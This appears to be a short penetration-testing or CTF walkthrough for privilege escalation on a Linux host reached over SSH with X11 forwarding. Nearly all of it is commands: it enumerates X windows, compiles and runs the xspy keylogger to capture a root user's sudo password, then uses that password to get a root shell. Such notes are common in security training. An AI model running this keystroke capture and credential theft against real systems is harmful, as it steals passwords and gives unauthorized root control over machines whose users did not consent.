### Initial Discovery
```
# SSH with X11 forwarding
ssh -X user@10.10.10.55

# Check DISPLAY
echo $DISPLAY
# localhost:10.0

# List open windows
xwininfo -root -tree
```

#### Capture Keystrokes
```
# Upload xspy
# xspy captures keystrokes from X11

# Compile xspy
gcc xspy.c -o xspy -lX11

# Run xspy
./xspy

# Wait for root to type password
# Captures: sudo password: hunter2
```

#### Use Captured Password
```
# Use captured sudo password
sudo su -
# password: hunter2

# Root access!
whoami
# root
```